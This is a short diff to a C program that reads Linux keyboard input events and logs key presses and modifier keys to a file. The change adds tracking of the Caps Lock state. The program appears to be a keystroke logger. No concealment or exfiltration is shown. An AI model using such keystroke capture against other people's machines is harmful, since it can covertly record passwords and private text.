@@ -70,7 +70,10 @@ int main(int argc, char *argv[]) {
                     alt_pressed = event.value;
                 }
                 // Log modifier keys independently
-                if (event.value == 1) {  // Key press
+                if (event.value == 1) {
+                    if (event.code == KEY_CAPSLOCK) {
+                        capslock_active = !capslock_active;
+                    }
                     if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                         log_key(fp, shift_pressed, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, "Shift");
                     } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
